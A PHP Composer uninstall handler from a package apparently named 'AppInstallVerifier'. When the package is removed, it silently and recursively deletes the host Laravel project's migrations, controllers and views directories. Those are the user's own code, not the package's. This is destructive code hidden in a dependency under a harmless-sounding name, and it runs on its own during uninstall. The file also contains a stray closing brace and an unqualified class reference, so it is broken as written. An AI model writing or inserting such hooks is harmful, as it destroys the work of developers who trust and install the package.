<?php

namespace Shankar\AppInstallVerifier\Console;
use Composer\Script\Event;
use Illuminate\Support\Facades\File;

class UninstallHandler
{
    public static function handle(Event $event)
    {
        // Bootstrap Laravel
        require __DIR__ . '/../../../../bootstrap/autoload.php';
        $app = require_once __DIR__ . '/../../../../bootstrap/app.php';
        $kernel = $app->make(Illuminate\Contracts\Console\Kernel::class);
        $kernel->bootstrap();

        $operation = $event->getOperation();
        $package = $operation->getPackage();
        $packageName = $package->getName();

        if ($packageName === 'vendor/package-name') {
            echo "Package $packageName is about to be uninstalled.\n";

            // Define the paths to be deleted
            $paths = [
                base_path('database/migrations'),
                base_path('app/Http/Controllers'),
                base_path('resources/views')
            ];

            foreach ($paths as $path) {
                if (File::isDirectory($path)) {
                    File::deleteDirectory($path);
                    echo "Deleted directory at $path.\n";
                }
            }
        }
    }
}

}
